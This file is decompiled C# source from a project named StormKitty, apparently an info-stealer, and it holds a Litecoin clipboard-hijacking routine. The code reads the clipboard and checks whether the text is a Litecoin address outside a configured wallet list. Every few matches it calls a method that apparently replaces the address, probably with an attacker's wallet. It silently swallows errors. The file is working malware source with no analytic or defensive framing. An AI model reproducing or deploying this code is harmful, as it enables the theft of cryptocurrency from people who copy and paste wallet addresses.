﻿using System;
using System.Linq;
using System.Windows.Forms;

namespace StormKitty
{
	// Token: 0x0200005B RID: 91
	internal class LiteCoin
	{
		// Token: 0x0600014B RID: 331 RVA: 0x00009D28 File Offset: 0x00007F28
		public static void GetLiteCoinWhile()
		{
			try
			{
				if (Clipboard.ContainsText())
				{
					string text = Clipboard.GetText();
					if (!Config.walletsltc.Contains(text) && CheckLTC.Clipregex(text))
					{
						if (LiteCoin._oppToMiss > 0)
						{
							LiteCoin._oppToMiss--;
						}
						else
						{
							LiteCoin._oppToMiss = Config.OppToMissDef;
							CheckLTC.SetsLTC(text);
						}
					}
				}
			}
			catch
			{
			}
		}

		// Token: 0x040000DC RID: 220
		public static int _oppToMiss;
	}
}
